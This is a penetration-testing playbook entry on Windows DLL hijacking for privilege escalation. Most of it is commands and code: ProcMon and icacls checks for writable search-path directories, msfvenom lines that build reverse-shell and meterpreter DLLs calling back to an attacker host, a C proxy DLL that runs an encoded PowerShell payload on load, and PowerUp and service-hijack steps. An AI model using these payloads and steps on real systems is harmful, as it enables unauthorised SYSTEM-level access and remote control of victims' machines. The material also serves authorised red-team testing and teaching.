---
id: windows-dll-hijack
title: DLL Hijacking
stage: privesc
tags: [windows]
tools:
  - procmon.exe (filter: PATH NOT FOUND + .dll)
  - msfvenom -p windows/x64/shell_reverse_tcp -f dll -o evil.dll
  - icacls "C:\path\to\dir"
leads_to: [system-shell, rev-shell]
summary: Place a malicious DLL in a directory searched before the legitimate one to execute code in the context of a privileged process.
---

## Find Hijackable DLLs with ProcMon

Run on the target (or transfer Sysinternals ProcMon):

```
Filter: Process Name → target process
Filter: Result → NAME NOT FOUND
Filter: Path → ends with .dll
```

Look for DLL loads that fail in a user-writable directory (e.g., `C:\Program Files\App\missing.dll`).

## Identify Writable Directories in Search Order

Windows DLL search order (SafeDLLSearchMode ON):
1. Application directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. CWD
6. `%PATH%` directories

```powershell
# Check if the app directory is writable
icacls "C:\Program Files\VulnerableApp\"
# Look for: BUILTIN\Users:(W) or your user:(W)

# Check PATH entries for writable directories
$env:PATH -split ';' | ForEach-Object { icacls $_ 2>$null | Select-String "(W)" }
```

## Build the Malicious DLL

```bash
# Reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll

# Or with meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll
```

For a DLL that must export specific functions (required by some apps), use a proxy DLL:

```c
// Minimal proxy dll (compile with: x86_64-w64-mingw32-gcc -shared -o target.dll proxy.c)
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd /c powershell -enc BASE64_PAYLOAD");
    }
    return TRUE;
}
```

## Automated Discovery — PowerUp

```powershell
. .\PowerUp.ps1
Invoke-AllChecks

# Specifically for DLL hijacking:
Find-DLLHijack
Find-PathDLLHijack
```

## Service DLL Hijacking

If a service runs as SYSTEM and loads a missing DLL from a writable path:

```powershell
# Find services and their binary paths
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode, State

# Check the binary's directory for writability
icacls (Split-Path -Parent "C:\Service\service.exe")
```

Place DLL → restart service (if you have rights) or wait for reboot.

## Notes

- DLL hijacking is particularly powerful when the target process runs as SYSTEM or Administrator
- Some apps explicitly load DLLs via `LoadLibrary` — check with strings or IDA for hardcoded paths
- Phantom DLLs (DLLs the app tries to load but that don't exist) are the easiest — no need to forward exports
- Always check the app directory first — it's searched before System32 and is often writable

